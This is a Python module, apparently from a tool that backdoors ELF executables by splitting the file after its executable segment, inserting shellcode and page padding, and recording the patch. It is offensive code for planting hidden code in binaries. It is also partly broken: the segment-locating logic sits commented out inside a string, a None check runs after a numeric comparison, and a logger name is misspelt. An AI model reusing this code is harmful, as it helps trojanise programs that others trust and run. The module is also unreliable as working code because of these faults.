import os
import logging
from core import enum

logger = logging.getLogger(__name__)

class text_splitting:
    def __init__(self,BDF=None):
        logger.debug("In file {0}".format(str(os.path.abspath(__file__))))
        self.name = """text_splitting"""
        #maybe add supported methods
        self.description = """split text section and add code"""
        self.requirements = {
                            }
        self.BDF = BDF
        self.supported_methods = ['text_off_entry']

    def invoke_mode(self):

        return self.split_section()

    def split_section(self):

        # Convert all of this to patch_instr
        self.BDF.newBuffer = self.BDF.elf_object['shellcode_length']
        '''
        self.BDF.elf_object['loaded_binary'].seek(24, 0)

        self.BDF.headerTracker = 0x0
        self.BDF.PAGE_SIZE = 4096
        self.BDF.newOffset = None
        #find range of the first PT_LOAD section
        for header, values in self.BDF.elf_object['prog_hdr'].items():
            #print 'program header', header, values
            if values['p_flags'] == 0x5 and values['p_type'] == 0x1:
                #print "Found text segment"
                self.BDF.shellcode_vaddr = values['p_vaddr'] + values['p_filesz']
                beginOfSegment = values['p_vaddr']
                oldentry = self.BDF.elf_object['e_entry']
                #sizeOfNewSegment = values['p_memsz'] + self.BDF.newBuffer
                #LOCofNewSegment = values['p_filesz'] + self.BDF.newBuffer
                self.BDF.headerTracker = header
                self.BDF.newOffset = values['p_offset'] + values['p_filesz']
        '''
        self.BDF.elf_object['loaded_binary'].seek(0)
        if self.BDF.newOffset > 4294967296 or self.BDF.newOffset is None:
            logger.error("[!] Fuzz Fuzz Fuzz the bin")
            return False
        if self.BDF.newOffset > self.BDF.elf_object['file_size']:
            loggers.error("[!] The file is really not that big")
            return False
        logger.debug(f"Length of newOffset: {self.BDF.newOffset}")

        file_1st_part = self.BDF.elf_object['loaded_binary'].read(self.BDF.newOffset)

        #newSectionOffset = self.BDF.elf_object['loaded_binary'].tell()
        #logger.debug(f"newSectionOffset: {hex(newSectionOffset)}")
        file_2nd_part = self.BDF.elf_object['loaded_binary'].read()
        #print('len file_2nd_part', hex(len(file_2nd_part)))
        self.BDF.patch_instr['COPY'] = [self.BDF.newOffset, -1]
        #self.BDF.elf_object['loaded_binary'] = open(self.backdoorfile, "w+b")
        # use COPY instruction
        self.BDF.elf_object['loaded_binary'].seek(0)
        self.BDF.elf_object['loaded_binary'].write(file_1st_part)

        self.BDF.elf_object['loaded_binary'].write(self.BDF.elf_object['shellcode'])

        self.BDF.patch_instr[self.BDF.newOffset] = self.BDF.elf_object['shellcode']

        self.BDF.elf_object['loaded_binary'].write(b"\x00" * (self.BDF.PAGE_SIZE - self.BDF.elf_object['shellcode_length']))
        self.BDF.patch_instr['CONT1'] = b"\x00" * (self.BDF.PAGE_SIZE - self.BDF.elf_object['shellcode_length'])
        self.BDF.patch_instr['PASTE'] = self.BDF.elf_object['loaded_binary'].tell()
        #self.BDF.patch_instr['PASTE'] = self.BDF.newOffset + self.BDF.PAGE_SIZE 

        self.BDF.elf_object['loaded_binary'].write(file_2nd_part)

        self.BDF.elf_object['loaded_binary'].seek(0)

        return True
